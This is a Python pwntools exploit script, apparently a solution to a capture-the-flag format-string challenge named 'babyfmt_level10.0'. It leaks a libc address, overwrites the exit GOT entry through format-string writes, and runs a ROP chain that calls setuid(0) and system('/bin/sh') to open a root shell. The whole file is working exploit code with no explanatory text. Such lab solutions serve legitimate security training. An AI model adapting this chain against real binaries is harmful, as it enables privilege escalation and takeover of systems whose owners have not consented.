from pwn import *
context.binary = "/challenge/babyfmt_level10.0"
context.terminal = ['tmux','splitw','-h']
exit_got = 0x404068
pop_rdi = 0x0000000000401823
func = 0x004014c0+4
ret = 0x000000000040101a
#p = process()
while True:
    #p = gdb.debug("/challenge/babyfmt_level10.0")
    p = process()
    payload = b'%18$p'
    payload += b'A' + bytes('%{}c%27$hn'.format(5270).ljust(19,'.'),'utf-8') + p64(exit_got)
    p.sendline(payload)
    try:
        p.recvuntil(b'Your input is:')
        p.recvline()
        leak = int(p.recvuntil(b'A').decode().strip('A'),base=16) -0x1db9c1
        temp = hex(leak) #+ 0x18ba8
        if temp[-3:] == '000': 
            log.info("Leak libc: %s", hex(leak))
            break
        else: pass
    except Exception:
        pass
    p.close()
p.recv()
time.sleep(1)
add_rsp_0xe0 = leak+ 0x20ef1 #-0x4ff+16
setuid = leak+0xc2150
bin_sh = leak + 0x1925bd
system_func = leak + 0x30290
payload2 = b'A'
payload2 += fmtstr_payload(24,{exit_got:add_rsp_0xe0},32) + cyclic(0x38)
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_func) #b'B'*16 + b'C'*16 + b'D'*16
p.sendline(payload2)
#str('%32c%{}$hhn%6102c%{}$hn'.format(28,29).ljust(32,'.')).encode() + p64(temp+2) + p64(temp)
#fmtstr_payload(24,{temp:add_rsp},32) #+ fmtstr_payload(30,{exit_got:add_rsp},32+)
#print(payload2)
#p.sendline(payload2)
# time.sleep(1)
# payload3 = b'A' + fmtstr_payload(24,{exit_got:add_rsp},32)
# p.sendline(payload3)
p.interactive()
#input: 23 (1), 24
#-0x5f
#5270: ret to func
#-0x490

